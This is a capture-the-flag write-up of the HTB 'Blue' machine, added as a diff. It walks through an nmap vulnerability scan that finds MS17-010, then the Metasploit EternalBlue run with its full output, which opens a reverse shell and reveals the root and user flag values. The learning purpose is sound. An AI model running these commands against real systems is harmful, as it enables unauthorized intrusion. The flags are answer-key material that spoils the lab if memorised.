@@ -1,0 +1,124 @@
+#####################
+# Sources and links #
+#####################
+Using nmap scripts:
+https://www.tecmint.com/use-nmap-script-engine-nse-scripts-in-linux/
+https://www.1337pwn.com/using-nmap-nse-vulscan-script-to-scan-for-vulnerabilities/
+
+#########
+# TL,DR #
+#########
+An nmap scan shows this box is vulnerable to Eternal Blue. A metasploit module gives root access.
+
+########
+# Hack #
+########
+# A quick nmap scan shows msrpc 135, 139 netbios-ssn, and 7938 lgtomapper along with other unknown ports.
+
+# A fuller nmap scan shows the computer is running Windows 7 Professional 7601 SP 1.
+
+# Using the '--script vuln' argument in an nmap scan, we see that the box is vulnerable to CVE-2017-0143:
+
+# Nmap 7.70 scan initiated Mon Jul 29 18:46:53 2019 as: nmap --script vuln -o nmap_vuln.txt 10.10.10.40
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+# Now we launch metasploit to see if there is an exploit available:
+msfconsole
+msf5 > search cve:cve-2017-0143
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank     Check  Description
+   -  ----                                           ---------------  ----     -----  -----------
+   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   1  auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection
+   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+
+# 2 looks promising, let's try it!
+
+msf5 > use exploit/windows/smb/ms17_010_eternalblue
+msf5 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target address range or CIDR identifier
+   RPORT          445              yes       The target port (TCP)
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+# Set remote host to point to the computer's IP address:
+
+msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
+RHOSTS => 10.10.10.40
+
+msf5 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 10.10.14.40:4444
+[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.10.40:445 - Connecting to target for exploitation.
+[+] 10.10.10.40:445 - Connection established for exploitation.
+[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
+[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
+[*] 10.10.10.40:445 - Starting non-paged pool grooming
+[+] 10.10.10.40:445 - Sending SMBv2 buffers
+[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
+[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
+[*] 10.10.10.40:445 - Receiving response from exploit packet
+[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.10.40:445 - Sending egg to corrupted connection.
+[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
+[*] Command shell session 1 opened (10.10.14.40:4444 -> 10.10.10.40:49158) at 2019-07-29 21:14:12 -0600
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+# We're in with a root shell! Now naviagate to the respective directories and get the flags!
+
+C:\Windows\system32>
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+ff548eb71e920ff6c08843ce9df4e717
+C:\Users\Administrator\Desktop>type \Users\haris\Desktop\user.txt
+type \Users\haris\Desktop\user.txt
+4c546aea7dbee75cbd71de245c8deea9
+
+Blue successfully hacked!
+
+###########
+# Learned #
+###########
+
+'--script vuln' was a great help in identifying vulnerabilities with nmap.
+'type' is used to display a file in windows, similar to 'cat' on unix systems.
+
+
